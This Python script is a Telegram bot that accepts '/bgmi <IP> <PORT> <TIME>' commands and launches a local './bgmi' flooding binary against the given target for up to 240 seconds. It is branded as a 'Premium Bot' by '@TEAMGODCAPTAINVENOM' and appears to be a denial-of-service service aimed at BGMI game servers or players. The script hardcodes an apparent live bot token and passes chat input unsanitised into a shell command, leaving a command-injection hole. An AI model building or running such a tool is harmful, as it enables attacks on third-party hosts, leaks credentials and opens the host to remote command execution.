import subprocess
import telepot
from telepot.loop import MessageLoop

# Insert your Telegram bot token here (Never expose your token in a public script)
API_TOKEN = '7958002584:AAHkumH7gE6GZWUdSUhfwwDWqsOAoH5fsWo'

# Initialize the bot
bot = telepot.Bot(API_TOKEN)

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(chat_id, target, port, time):
    response = f"Attack Sent Successfully \n\nTarget: {target}\nTime: {time} Seconds\nOwner - @TEAMGODCAPTAINVENOM"
    bot.sendMessage(chat_id, response)

# Function to handle commands
def handle_command(msg):
    chat_id = msg['chat']['id']
    command = msg['text'].split()

    if command[0] == '/start':
        response = '''Welcome to the Premium Bot \nOwner - @TEAMGODCAPTAINVENOM'''
        bot.sendMessage(chat_id, response)
    
    elif command[0] == '/check':
        response = '''Now start the match'''
        bot.sendMessage(chat_id, response)

    elif command[0] == '/bgmi':
        if len(command) == 4:  # Expecting <IP> <PORT> <TIME>
            target = command[1]
            try:
                port = int(command[2])  # Convert port to integer
                time = int(command[3])  # Convert time to integer
            except ValueError:
                # Handle the case where port or time are not valid integers
                response = "Error: Port and Time must be integers."
                bot.sendMessage(chat_id, response)
                return

            if time > 240:
                response = "Error: Use less than 240 Seconds"
                bot.sendMessage(chat_id, response)
            else:
                start_attack_reply(chat_id, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 100"
                try:
                    subprocess.run(full_command, shell=True, check=True)
                    response = "Attack completed\nOwner - @TEAMGODCAPTAINVENOM"
                except subprocess.CalledProcessError as e:
                    response = f"Error executing command: {e}"
                bot.sendMessage(chat_id, response)
        else:
            response = "Please provide <IP> <PORT> <TIME>"
            bot.sendMessage(chat_id, response)

# Start listening for messages
MessageLoop(bot, handle_command).run_as_thread()

# Keep the program running
import time
while True:
    time.sleep(5)

